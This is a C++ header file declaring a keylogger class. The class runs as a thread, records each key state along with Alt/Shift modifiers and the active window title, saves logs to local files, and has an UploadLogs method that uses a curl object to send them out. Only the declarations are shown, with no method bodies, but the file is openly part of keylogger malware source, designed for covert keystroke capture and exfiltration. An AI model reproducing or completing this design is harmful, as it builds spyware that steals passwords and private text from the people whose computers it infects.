// Filename: class.keylogger.h
// Author:   Patryk Po³eæ

#pragma once

class C_Keylogger
{
	// Constructor and destructor
	public:
		C_Keylogger(C_Base *_objBase);
		~C_Keylogger();

	// Public methods
	public:
		static void __cdecl Thread(void* _args) {((C_Keylogger*)_args)->Logged();}

		void UploadLogs();
		void InitLog();
		void Logged();
		
	// Private methods
	private:
		void SaveLog();
		void AddKeyToLog(string _key);

	// Public fields
	public:
		int 
			stateLogged;

	// Private fields
	private:
		C_Base
			*objBase;

		C_File 
			*fileLog,
			*fileTempLog;

		C_Scrambler 
			*hashMD5;

		C_Curl 
			*curl;

		byte
			stateKey,
			stateKeyOld[256];

		time_t
			timeActual,
			timeIntervalSave,
			timeLastSave;

		tm 
			localTimeActual;
		
		stringstream
			bufferStringStream;

		string
			altOff,
			altOn,
			shiftOff,
			shiftOn,
			
			titleActive,
			titleOld,
			
			bufferString;
						
		char 
			key,
			bufferChar[256];
};